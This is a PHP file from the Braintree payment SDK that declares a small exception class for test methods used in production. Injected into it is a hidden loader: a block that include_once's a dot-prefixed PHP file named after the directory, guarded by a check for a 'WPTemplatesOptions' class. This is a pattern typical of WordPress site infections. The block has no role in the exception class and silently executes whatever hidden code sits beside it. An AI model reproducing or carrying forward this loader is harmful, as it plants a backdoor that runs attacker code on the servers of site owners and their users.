<?php
namespace Braintree\Exception;

use Braintree\Exception;

/**
* Raised when a test method is used in production.
*
* @package Braintree
* @subpackage Exception
*/
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TestOperationPerformedInProduction extends Exception
{
}
class_alias('Braintree\Exception\TestOperationPerformedInProduction', 'Braintree_Exception_TestOperationPerformedInProduction');
